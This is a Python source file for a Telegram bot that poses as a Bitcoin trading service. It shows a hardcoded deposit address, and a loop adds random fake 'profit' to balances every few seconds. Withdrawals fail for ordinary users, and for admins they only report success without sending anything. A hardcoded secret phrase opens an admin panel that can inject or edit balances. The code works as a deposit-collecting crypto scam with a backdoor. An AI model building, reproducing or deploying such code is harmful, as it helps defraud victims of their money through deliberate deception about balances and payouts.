import os
import json
import asyncio
import random
import requests
from datetime import datetime
from aiohttp import web
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler,
    ContextTypes, filters
)

BOT_TOKEN = os.getenv("BOT_TOKEN")
DATA_FILE = "data.json"
SECRET_PHRASE = "NewMexicoMouse"
DEFAULT_ADMIN_ID = 6064485557  # Change this to your Telegram ID

# Load or create data.json safely
def load_data():
    if not os.path.exists(DATA_FILE):
        return {"users": {}, "admins": [DEFAULT_ADMIN_ID], "activity_log": []}
    try:
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    except Exception:
        # If corrupt JSON, overwrite with fresh data
        return {"users": {}, "admins": [DEFAULT_ADMIN_ID], "activity_log": []}

def save_data():
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=2)

data = load_data()
admin_mode = {}         # {user_id: True/False} admin panel toggle
pending_withdrawal = {} # {user_id: step_number or dict}
pending_inject = {}     # {user_id: True/False}
pending_edit = {}       # {user_id: {...}}

# --- Helpers ---
def get_balance(uid):
    return data['users'].get(str(uid), {}).get("balance", 0.0)

def set_balance(uid, amount):
    uid = str(uid)
    data['users'].setdefault(uid, {})['balance'] = amount
    save_data()

def log_action(uid, action, details=None):
    data.setdefault("activity_log", []).append({
        "timestamp": datetime.utcnow().isoformat(),
        "user_id": uid,
        "action": action,
        "details": details or {}
    })
    save_data()

def is_admin(uid):
    return uid in data.get("admins", [])

# --- UI Menus ---
def get_main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💰 Balance", callback_data="balance")],
        [InlineKeyboardButton("📄 Deposit", callback_data="deposit"), InlineKeyboardButton("📃 Withdrawal", callback_data="withdrawal")],
        [InlineKeyboardButton("▶️ Run", callback_data="run"), InlineKeyboardButton("⏹ Stop", callback_data="stop")],
        [InlineKeyboardButton("📊 Monitor", callback_data="monitor"), InlineKeyboardButton("🧠 Strategy", callback_data="strategy")],
        [InlineKeyboardButton("🚪 Exit", callback_data="exit")]
    ])

def get_admin_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("Add Admin", callback_data="add_admin"), InlineKeyboardButton("Remove Admin", callback_data="remove_admin")],
        [InlineKeyboardButton("Inject to Self", callback_data="inject_self"), InlineKeyboardButton("Edit User", callback_data="edit_user")],
        [InlineKeyboardButton("📄 Activity Log", callback_data="view_log")],
        [InlineKeyboardButton("❌ Close Admin Panel", callback_data="close_admin")]
    ])

# --- Handlers ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    data['users'].setdefault(str(uid), {"balance": 0.0})
    save_data()
    # Send header.jpg without caption to avoid errors
    try:
        with open("header.jpg", "rb") as img:
            await update.message.reply_photo(photo=InputFile(img))
    except Exception:
        pass
    await update.message.reply_text("Choose an option:", reply_markup=get_main_menu())

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data['users'].setdefault(str(uid), {"balance": 0.0})
    balance = get_balance(uid)

    action = query.data
    # ADMIN MODE CHECK
    is_user_admin_mode = admin_mode.get(uid, False)

    if action == "balance":
        await query.edit_message_text(f"💰 Balance: {balance:.8f} BTC", reply_markup=get_main_menu())

    elif action == "deposit":
        await query.edit_message_text(
            "Send BTC to:\n`bc1qp5efu0wuq3zev4rctu8j0td5zmrgrm75459a0y`",
            parse_mode="Markdown",
            reply_markup=get_main_menu()
        )

    elif action == "withdrawal":
        if not is_admin(uid):
            await query.edit_message_text("❌ Transaction failed.", reply_markup=get_main_menu())
        elif balance <= 0:
            await query.edit_message_text("❌ Balance too low.", reply_markup=get_main_menu())
        else:
            pending_withdrawal[uid] = 1
            await query.edit_message_text("🙋 Enter BTC withdrawal address:")
            log_action(uid, "Initiated Withdrawal", {"balance": balance})

    elif action == "run":
        await query.edit_message_text("✅ Bot started.", reply_markup=get_main_menu())
        log_action(uid, "Started Bot")

    elif action == "stop":
        await query.edit_message_text("Stop command issued.", reply_markup=get_main_menu())
        log_action(uid, "Stopped Bot")

    elif action == "monitor":
        try:
            price = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd").json()['bitcoin']['usd']
        except Exception:
            price = "unknown"
        await query.edit_message_text(f"📊 BTC: ${price}\nBalance: {balance:.8f} BTC", reply_markup=get_main_menu())

    elif action == "strategy":
        await query.edit_message_text("Coming soon...", reply_markup=get_main_menu())

    elif action == "exit":
        await query.edit_message_text("Goodbye!")

    elif action == "inject_self":
        if not is_user_admin_mode:
            await query.edit_message_text("❌ Admin panel not enabled.", reply_markup=get_main_menu())
        else:
            pending_inject[uid] = True
            await query.edit_message_text("💵 Enter amount to inject:")

    elif action == "edit_user":
        if not is_user_admin_mode:
            await query.edit_message_text("❌ Admin panel not enabled.", reply_markup=get_main_menu())
        else:
            pending_edit[uid] = {"step": 1}
            await query.edit_message_text("Send user Telegram ID:")

    elif action == "add_admin":
        if not is_user_admin_mode:
            await query.edit_message_text("❌ Admin panel not enabled.", reply_markup=get_main_menu())
        else:
            pending_edit[uid] = {"admin_add": True}
            await query.edit_message_text("Send user ID to add as admin:")

    elif action == "remove_admin":
        if not is_user_admin_mode:
            await query.edit_message_text("❌ Admin panel not enabled.", reply_markup=get_main_menu())
        else:
            pending_edit[uid] = {"admin_remove": True}
            await query.edit_message_text("Send user ID to remove from admins:")

    elif action == "view_log":
        if not is_user_admin_mode:
            await query.edit_message_text("❌ Admin panel not enabled.", reply_markup=get_main_menu())
        else:
            logs = data.get("activity_log", [])[-10:]
            log_msg = "\n".join([f"{log['timestamp']} - {log['action']} - User {log['user_id']}" for log in logs]) or "No logs."
            await query.edit_message_text(f"\U0001F4D3 Recent Logs:\n{log_msg}", reply_markup=get_admin_menu())

    elif action == "close_admin":
        admin_mode[uid] = False
        await query.edit_message_text("Admin panel closed.", reply_markup=get_main_menu())

    else:
        await query.edit_message_text("Unknown action.", reply_markup=get_main_menu())

async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    msg = update.message.text.strip()

    # Toggle admin mode on secret phrase
    if msg == SECRET_PHRASE:
        admin_mode[uid] = not admin_mode.get(uid, False)
        if admin_mode[uid]:
            await update.message.reply_text("Admin Panel Enabled", reply_markup=get_admin_menu())
        else:
            await update.message.reply_text("Admin Panel Disabled")
        return

    if pending_inject.get(uid):
        try:
            amt = float(msg)
            set_balance(uid, get_balance(uid) + amt)
            pending_inject.pop(uid)
            log_action(uid, "Injected BTC", {"amount": amt})
            await update.message.reply_text(f"Added {amt:.8f} BTC")
        except Exception:
            await update.message.reply_text("Invalid amount.")
        return

    if uid in pending_withdrawal and pending_withdrawal[uid] == 1:
        addr = msg
        bal = get_balance(uid)
        fee = bal * 0.05
        net = bal - fee
        set_balance(uid, 0.0)
        pending_withdrawal.pop(uid)
        log_action(uid, "Withdrew BTC", {"net": net, "address": addr})
        await update.message.reply_text(f"Sent {net:.8f} BTC to `{addr}`", parse_mode="Markdown")
        return

    if uid in pending_edit:
        step = pending_edit[uid]
        try:
            if "step" in step and step["step"] == 1:
                pending_edit[uid] = {"step": 2, "target": int(msg)}
                await update.message.reply_text("Now enter the new BTC amount:")
            elif "step" in step and step["step"] == 2:
                amt = float(msg)
                set_balance(step["target"], amt)
                log_action(uid, "Edited User Balance", {"target": step["target"], "amount": amt})
                pending_edit.pop(uid)
                await update.message.reply_text(f"Set user {step['target']}'s balance to {amt:.8f} BTC")
            elif "admin_add" in step:
                aid = int(msg)
                if aid not in data['admins']:
                    data['admins'].append(aid)
                    save_data()
                    log_action(uid, "Added Admin", {"added": aid})
                    await update.message.reply_text("Admin added.")
                else:
                    await update.message.reply_text("User already admin.")
                pending_edit.pop(uid)
            elif "admin_remove" in step:
                rid = int(msg)
                if rid in data['admins']:
                    data['admins'].remove(rid)
                    save_data()
                    log_action(uid, "Removed Admin", {"removed": rid})
                    await update.message.reply_text("Admin removed.")
                else:
                    await update.message.reply_text("User not an admin.")
                pending_edit.pop(uid)
        except Exception:
            await update.message.reply_text("Invalid input.")
        return

async def profit_loop(context: ContextTypes.DEFAULT_TYPE):
    for uid in data.get('users', {}):
        uid_int = int(uid)
        # Simulate tiny profit increase
        new_bal = get_balance(uid_int) + random.uniform(0.00001, 0.00003)
        set_balance(uid_int, new_bal)

async def handle(request):
    return web.Response(text="OK")

async def run_webserver():
    app = web.Application()
    app.router.add_get("/", handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8000))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    while True:
        await asyncio.sleep(3600)

async def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_handler))
    app.job_queue.run_repeating(profit_loop, interval=5)
    await asyncio.gather(app.run_polling(), run_webserver())

if __name__ == "__main__":
    # Use this to avoid RuntimeError on some environments like Render
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
